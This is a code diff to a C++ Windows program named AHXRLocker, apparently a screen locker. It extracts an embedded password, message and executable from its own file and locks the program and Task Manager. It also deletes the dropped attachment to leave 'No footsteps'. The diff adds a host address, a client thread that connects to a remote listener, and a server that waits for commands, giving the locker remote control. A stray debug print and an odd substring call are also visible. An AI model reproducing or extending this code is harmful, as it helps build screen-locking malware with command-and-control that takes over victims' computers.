@@ -35,6 +35,8 @@ static System::String ^ getMessage();
 #include "sha256.h"
 #include "frmScreenLock.h"
 #include "handleThread.h"
+#include "clientThread.h"
+#include "serverThread.h"
 
 #include <string>
 #include <fstream>
@@ -45,16 +47,17 @@ using namespace System;
 using namespace System::Windows::Forms;
 using namespace msclr::interop;
 
-static std::string 
+std::string 
 	s_password,
-	s_message
+	s_message,
+	s_server_host
 ;
 
 [STAThread]
 int main() {
 
 #ifdef DEBUG_MODE
-	packLocker(DUMMY_FILE, DUMMY_PASSWORD, DUMMY_MESSAGE);
+	packLocker(DUMMY_FILE, DUMMY_PASSWORD, DUMMY_MESSAGE, "127.0.0.1");
 	attachExecutable(DUMMY_FILE, DUMMY_EXE);
 
 	// Attempting to open and read own .exe file.
@@ -100,11 +103,11 @@ int main() {
 		f_exe_l.close();
 
 		i_length = static_cast<int>(is_length); // Data loss prevention.
-		
+
 		/*
 			Going back to our .exe file and setting the starting reading spot.
-			
-			But that reading spot is at the END of the file. So we're going to start at 
+
+			But that reading spot is at the END of the file. So we're going to start at
 			the length of the file then go back just so we can read from point A to B.
 
 			Finding how far we need to go back (due to exe attachments).
@@ -119,7 +122,7 @@ int main() {
 			Whenever the file was packed, the password/message/attachment were split
 			by 4 dashes. In previous versions (before .exe attachment), it made it extremely
 			painful to find a starting search spot because the opener and closer symbols are
-			common in an encrypted file. 
+			common in an encrypted file.
 
 			After debugging, it seems that .exe files have a bunch of symbols that show up consistently.
 			Even if we read the file backwards, we wouldn't know the length of the attached .exe file.
@@ -130,7 +133,7 @@ int main() {
 			to separate the password/message/attachment.
 		*/
 #ifdef DEBUG_MODE
-		for (unsigned int i = 0; i < 3; i ++ ) 
+		for (unsigned int i = 0; i < 4; i++)
 			t_first_open = s_search.find("----", t_first_open + 3);
 #else
 		for (unsigned int i = 0; i < 2; i++)
@@ -138,9 +141,9 @@ int main() {
 #endif
 
 		// Checking if there are any packs to begin with. If not: exit.
-		if (t_first_open == std::string::npos) 
+		if (t_first_open == std::string::npos)
 			exit(0);
-		
+
 		f_exe.seekg(t_first_open); // Let's start reading from the REAL splitter now.
 
 		// Obtaining the password hash.
@@ -161,11 +164,27 @@ int main() {
 		std::cout << s_message << "\r\n\r\n"; // Debugging the output.
 #endif
 
+		// Obtaining the host.
+		size_t t_host_open = s_search.find(SEARCH_OPENER, t_msg_close);
+		size_t t_host_close = s_search.find(SEARCH_CLOSER, t_host_open);
+
+		s_server_host = s_search.substr(t_host_open + 1, t_host_close - t_host_open - 1); // Adjusting character positions.
+		setHostAddress((char *)s_server_host.c_str());
+
+#ifdef DEBUG_MODE
+		std::cout << s_server_host << "\r\n\r\n"; // Debugging the output.
+#endif
+
+		std::cout << s_server_host << "\r\n\r\n"; // Debugging the output.
+
 		// Obtaining the .exe attachment.
-		size_t t_exe_open = s_search.find(SEARCH_OPENER, t_msg_close);
+		size_t t_exe_open = s_search.find(SEARCH_OPENER, t_host_close);
 
 		if (t_exe_open != std::string::npos) {
 			f_exe.seekg(t_exe_open + 1); // Setting position to read the attached .exe
+			
+			std::string s_test = s_search.substr(t_exe_open, EOF);
+			std::cout << s_test[1];
 
 			char c_exe_read;
 			std::fstream f_attach(ATTACH_FILE, std::ios::out | std::ios::binary);
@@ -197,12 +216,21 @@ int main() {
 
 	startHandleThreading(); // Locking the program & taskmgr.
 
+	if (s_server_host.compare("0") != 0) {
+		startClientThread(); // Connect user to listener (if any)
+		startServer(); // Server listening for commands.
+	}
+
 	// Running the form.
 	Application::EnableVisualStyles();
 	Application::SetCompatibleTextRenderingDefault(false);
 	AHXRLocker::frmScreenLock frm;
 	Application::Run(%frm);	
 	
+	// Safe socket clean-up.
+	closesocket(ConnectSocket);
+	WSACleanup();
+
 	system("pause");
 	return 0;
 }
@@ -221,6 +249,9 @@ static void comparePasswords(String ^ passwordInput) {
 
 		if (b_exe_attach)
 			remove(ATTACH_FILE_C); // Remove the attachment file before closing. No footsteps.
+
+		closesocket(ConnectSocket);
+		WSACleanup();
 
 		exit(1);
 	}
